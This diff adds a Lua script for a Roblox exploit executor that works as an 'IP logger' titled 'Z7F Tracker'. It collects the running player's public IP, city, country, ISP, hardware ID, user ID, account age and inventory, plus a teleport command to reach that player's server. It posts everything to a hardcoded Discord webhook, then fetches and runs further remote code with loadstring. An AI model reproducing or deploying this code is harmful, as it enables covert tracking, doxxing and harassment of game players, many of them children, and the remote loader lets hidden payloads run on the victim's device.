@@ -1,0 +1,126 @@
+local fenv=getfenv()
+local _call3 =game:GetService("HttpService")
+local _call7 =game:GetService("Stats")
+local _call9 =game:GetService("UserInputService")
+local _call11 =game:GetService("RbxAnalyticsService")
+local _LocalPlayer12 =game:GetService("Players")["LocalPlayer"]
+local _call16 =_call3:JSONDecode(game:HttpGet("http://ip-api.com/json/?fields=status,country,countryCode,regionName,city,isp,query,timezone,as"))
+local _17, _17_2 =identifyexecutor()
+local _gamePlaceId20 =game["PlaceId"]
+local _gameJobId21 =game["JobId"]
+local _call23 =task["spawn"](function()
+local _26, _26_2, _26_3 =string.lower(_call16["countryCode"])
+for _41, _41_2 in ipairs(_LocalPlayer12["Backpack"]:GetChildren()) do
+local _call43 =_41_2:IsA("Tool")
+end
+for _48, _48_2 in ipairs(_LocalPlayer12["Character"]:GetChildren()) do
+local _call50 =_48_2:IsA("Tool")
+end
+local _call87 =game:GetService("MarketplaceService")
+local _call99 =_call3:JSONEncode({
+  ["embeds"] = {
+  [1] = {
+  ["fields"] = {
+  [1] = {
+  ["value"] = "```yaml\n" .. _LocalPlayer12["Name"] .. "```",
+  ["name"] = "\xF0\x9F\x91\xA4 **\xD8\xA7\xD9\x84\xD8\xAD\xD8\xB3\xD8\xA7\xD8\xA8**",
+  ["inline"] = false,
+},
+  [2] = {
+  ["value"] = "```fix\n".._41_2["Name"].." \xD8\x8C <25ms_concat_me>_48_2["Name"] .. " (\xD9\x85\xD8\xAC\xD9\x87\xD8\xB2)"</25ms_concat_me>```",
+  ["name"] = "\xF0\x9F\x8E\x92 **\xD8\xA7\xD9\x84\xD8\xA3\xD8\xBA\xD8\xB1\xD8\xA7\xD8\xB6 \xD8\xA7\xD9\x84\xD8\xAA\xD9\x8A \xD9\x85\xD8\xB9 \xD8\xA7\xD9\x84\xD9\x84\xD8\xA7\xD8\xB9\xD8\xA8**",
+  ["inline"] = false,
+},
+  [3] = {
+  ["value"] = "```" .. _17 .. "```",
+  ["name"] = "\xF0\x9F\x9B\xA1\xEF\xB8\x8F **\xD9\x86\xD9\x88\xD8\xB9 \xD8\xA7\xD9\x84\xD9\x87\xD8\xA7\xD9\x83**",
+  ["inline"] = true,
+},
+  [4] = {
+  ["value"] = "```" .. _LocalPlayer12["AccountAge"] .. " \xD9\x8A\xD9\x88\xD9\x85```",
+  ["name"] = "\xF0\x9F\x95\x92 **\xD8\xB9\xD9\x85\xD8\xB1 \xD8\xA7\xD9\x84\xD8\xAD\xD8\xB3\xD8\xA7\xD8\xA8**",
+  ["inline"] = true,
+},
+  [5] = {
+  ["value"] = "```" .. _LocalPlayer12["UserId"] .. "```",
+  ["name"] = "\xF0\x9F\x86\x94 **\xD8\xA7\xD9\x8A\xD8\xAF\xD9\x8A \xD8\xA7\xD9\x84\xD9\x84\xD8\xA7\xD8\xB9\xD8\xA8**",
+  ["inline"] = true,
+},
+  [6] = {
+  ["value"] = "```" .. _call16["query"] .. "```",
+  ["name"] = "\xF0\x9F\x8C\x90 **IP**",
+  ["inline"] = true,
+},
+  [7] = {
+  ["value"] = "```" .. _call11:GetClientId().. "```",
+  ["name"] = "\xF0\x9F\x94\x91 **HWID**",
+  ["inline"] = true,
+},
+  [8] = {
+  ["value"] = "```" .. _call9:GetPlatform()["Name"] .. "```",
+  ["name"] = "\xF0\x9F\x93\xB1 **\xD9\x86\xD9\x88\xD8\xB9 \xD8\xA7\xD9\x84\xD8\xAC\xD9\x87\xD8\xA7\xD8\xB2**",
+  ["inline"] = true,
+},
+  [9] = {
+  ["value"] = "```" .. _call16["city"] .. "```",
+  ["name"] = "\xF0\x9F\x8F\x99\xEF\xB8\x8F **\xD8\xA7\xD9\x84\xD9\x85\xD8\xAF\xD9\x8A\xD9\x86\xD8\xA9**",
+  ["inline"] = true,
+},
+  [10] = {
+  ["value"] = "```" .. _call16["country"] .. " " .. _call16["countryCode"] .. "```",
+  ["name"] = "\xF0\x9F\x8F\xB3\xEF\xB8\x8F **\xD8\xA7\xD9\x84\xD8\xAF\xD9\x88\xD9\x84\xD8\xA9**",
+  ["inline"] = true,
+},
+  [11] = {
+  ["value"] = "[\xD8\xA7\xD8\xB6\xD8\xBA\xD8\xB7 \xD9\x87\xD9\x86\xD8\xA7 \xD9\x84\xD8\xB9\xD8\xB1\xD8\xB6 \xD8\xAA\xD9\x81\xD8\xA7\xD8\xB5\xD9\x8A\xD9\x84 \xD8\xA7\xD9\x84\xD9\x80 IP](" .. "https://whatismyipaddress.com/ip/" .. _call16["query"] .. ")",
+  ["name"] = "\xF0\x9F\x97\xBA\xEF\xB8\x8F **\xD8\xB1\xD8\xA7\xD8\xA8\xD8\xB7 \xD9\x85\xD9\x88\xD9\x82\xD8\xB9 \xD8\xA7\xD9\x84\xD9\x84\xD8\xA7\xD8\xB9\xD8\xA8**",
+  ["inline"] = false,
+},
+  [12] = {
+  ["value"] = "```" .. _gameJobId21 .. "```",
+  ["name"] = "\xF0\x9F\xA7\xA9 **JobId**",
+  ["inline"] = true,
+},
+  [13] = {
+  ["value"] = "```" .. _gamePlaceId20 .. "```",
+  ["name"] = "\xF0\x9F\xA7\xA9 **\xD9\x85\xD8\xB9\xD8\xB1\xD9\x81 \xD8\xA7\xD9\x84\xD9\x85\xD8\xA7\xD8\xA8**",
+  ["inline"] = true,
+},
+  [14] = {
+  ["value"] = "```" .. _call87:GetProductInfo(_gamePlaceId20)["Name"] .. "```",
+  ["name"] = "\xF0\x9F\x93\x8C **\xD8\xA7\xD8\xB3\xD9\x85 \xD8\xA7\xD9\x84\xD9\x85\xD8\xA7\xD8\xA8**",
+  ["inline"] = true,
+},
+  [15] = {
+  ["value"] = "```lua\n" .. "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. _gamePlaceId20 .. ", '" .. _gameJobId21 .. "', game.Players.LocalPlayer)" .. "```",
+  ["name"] = "\xF0\x9F\x9A\x80 **\xD8\xB3\xD9\x83\xD8\xB1\xD8\xA8\xD8\xAA \xD8\xA7\xD9\x84\xD8\xAC\xD9\x88\xD9\x8A\xD9\x86**",
+  ["inline"] = false,
+},
+},
+  ["title"] = "\xF0\x9F\x9B\xB0\xEF\xB8\x8F \xD8\xAA\xD9\x82\xD8\xB1\xD9\x8A\xD8\xB1 | Z7F",
+  ["footer"] = {
+  ["text"] = "\xD8\xAA\xD9\x85 \xD8\xA7\xD9\x84\xD8\xA5\xD8\xB1\xD8\xB3\xD8\xA7\xD9\x84 \xD8\xA8\xD9\x88\xD8\xA7\xD8\xB3\xD8\xB7\xD8\xA9 Z7F Tracker \xD9\x81\xD9\x8A: 2026-01-17 | 11:25:49",
+},
+  ["color"] = 16711680,
+  ["author"] = {
+  ["name"] = "Z7F Tracker",
+  ["icon_url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. _LocalPlayer12["UserId"] .. "&width=420&height=420&format=png",
+},
+  ["thumbnail"] = {
+  ["url"] = "https://raw.githubusercontent.com/stevenrskelton/flag-icon/master/png/75/country/" .. _26 .. ".png",
+},
+},
+},
+})
+local _syn100=fenv["syn"]
+local _callhttp_request101 =http_request({
+  ["Body"] = _call99,
+  ["Url"] = "https://discord.com/api/webhooks/1462031135629377589/0u-eiBfTLGNMS9utp9Zo8ExEmmCSraGDKsS5cRDGcsziYHCyy7eXnXcnA39X3OyvLZBA",
+  ["Method"] = "POST",
+  ["Headers"] = {
+  ["Content-Type"] = "application/json",
+},
+})
+end)
+local _ =wait(1)
+local _105 =loadstring(game:HttpGet("https://raw.githubusercontent.com/Z7F-KING/Logger/refs/heads/main/IP-Logger-Here-By-Aziz"))()
